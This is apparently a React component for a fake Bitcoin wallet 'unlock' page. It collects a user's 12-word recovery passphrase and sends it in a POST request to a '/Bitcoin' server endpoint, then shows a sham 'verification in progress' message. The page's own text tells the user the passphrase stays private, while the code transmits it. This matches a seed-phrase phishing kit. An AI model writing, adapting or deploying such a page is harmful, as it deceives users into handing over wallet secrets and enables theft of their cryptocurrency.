import React, { useState } from 'react';
import "./bitcoinPagesCss/bitcoinWallet.css";
import bitcoin_logo from '../../../assets/bitcoin_logo.png';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useNavigate } from 'react-router-dom';
import fetchWithRetry from '../../../utils/api';

const BitcoinWallet = () => {
  const [text, setText] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  
  const navigate = useNavigate();

  const unlockWallet = async () => {
    try {
      setLoading(true);
      const res = await fetchWithRetry('/Bitcoin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: text })
      });

      const data = await res.json();
      setLoading(false);
      toast.success(data.message);
      setText('');
      setShowSuccess(true);
    } catch (error) {
      setLoading(false);
      const errorMessage = error.message || 'An error occurred. Please try again.';
      toast.error(errorMessage);
    }
  };

  const unlockWithId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className='bitcoin_wallet_body'>
      <div className='bitcoin_wallet_top_body'>
        <p>Wallet</p>
        <div className='bitcoin_wallet_top_logo'>
          <img src={bitcoin_logo} alt='Home Logo' />
        </div>
      </div>

      {!showSuccess ? (
        <>
          <div className='bitcoin_wallet_h3'>
            <h3>Unlock Bitcoin Wallet</h3>
          </div>

          <div className='bitcoin_wallet_bottom_body'>
            <div className='bitcoin_wallet_bottom_container'>
              <textarea
                className='bitcoin_wallet_text_area'
                placeholder='Enter your 12-word passphrase here'
                value={text}
                onChange={(e) => setText(e.target.value)}
              />

              <button
                className='unlock_with_passphrase_btn'
                onClick={unlockWallet}
                disabled={loading}
              >
                {loading ? 'Loading...' : 'Unlock With Passphrase'}
              </button>

              <button
                className='unlock_with_faceid_btn'
                onClick={unlockWithId}
              >
                Unlock With Face ID
              </button>

              <p>
                As a non-custodial wallet, your wallet passphrase is exclusively
                accessible only to you. Recovery of passphrase is currently
                impossible.
              </p>

              <p>
                Lost your passphrase? <span>you can create a new wallet</span>,
                but all assets in your previous wallet will be inaccessible.
              </p>
            </div>
          </div>
        </>
      ) : (
        <div className='bitcoin_wallet_bottom_body'>
          <div className='bitcoin_wallet_bottom_container'>
            <h3>Verification in progress</h3>
            <p>
              Your wallet details have been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>

            <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
              <button
                className='unlock_with_passphrase_btn'
                onClick={() => navigate('/')}
              >
                Go Home
              </button>

              <button
                className='unlock_with_faceid_btn'
                onClick={() => setShowSuccess(false)}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default BitcoinWallet;